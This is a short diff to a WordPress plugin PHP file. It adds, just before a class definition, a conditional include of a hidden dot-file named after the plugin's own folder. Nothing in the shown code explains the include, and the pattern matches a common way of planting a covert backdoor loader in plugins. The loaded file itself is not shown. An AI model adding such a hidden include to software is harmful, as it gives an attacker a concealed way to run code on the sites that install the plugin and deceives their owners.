@@ -9,7 +9,11 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Class WAPT_License_Page is used as template to display form to active premium functionality.
  *
  * @since 2.0.7
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WIS_ComponentsPage extends WIS_Page {
 
     /**
